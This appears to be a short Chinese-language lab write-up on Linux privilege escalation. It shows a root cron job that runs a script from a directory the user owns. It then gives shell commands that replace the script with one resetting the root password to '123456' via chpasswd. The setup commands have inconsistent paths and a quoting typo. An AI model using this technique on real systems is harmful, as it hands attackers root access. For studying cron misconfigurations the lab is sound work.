# 环境准备

**1.root账户配置如下命令：**

```shell
groupadd aplyc1a
useradd -d /home/aplyc1a -m aplyc1a -g aplyc1a -s /bin/bash -p 123456
mkdir -p ~aplyc1a/escal
chown aplyc1a:aplyc1a ~aplyc1a/escal
chmod a+x ~aplyc1a/escal
```

**2.环境内本身有一定时任务：**

root账户定时检查aplyc1a家目录下的文件是否被篡改。

```text
echo '#!/bin/bash' >> ~aplyc1a/escal/.hourlychk.sh
echo "find ~aplyc1a -user root -type f -exec md5sum {}\;"
chmod 744 ~aplyc1a/.escal/hourlychk.sh
echo "* */1 * * * root /home/aplyc1a/escal/.hourlychk.sh" >> /etc/crontab
```

# 攻击实施

由于.hourlychk.sh所在的目录/home/aplyc1a/escal/属主属组是aplyc1a，换句话来说完全可控，因此攻击者获得aplyc1a账户后，可以删除/home/aplyc1a/escal/目录，再重新创建一个新的目录及对应的~aplyc1a/escal/.hourlychk.sh，内部写入恶意命令：


```shell
echo '#!/bin/bash' >> ~aplyc1a/escal/.hourlychk.sh
echo "echo \root:123456\" | chpasswd" >> ~aplyc1a/escal/.hourlychk.sh
chmod a+x ~aplyc1a/escal/.hourlychk.sh
```
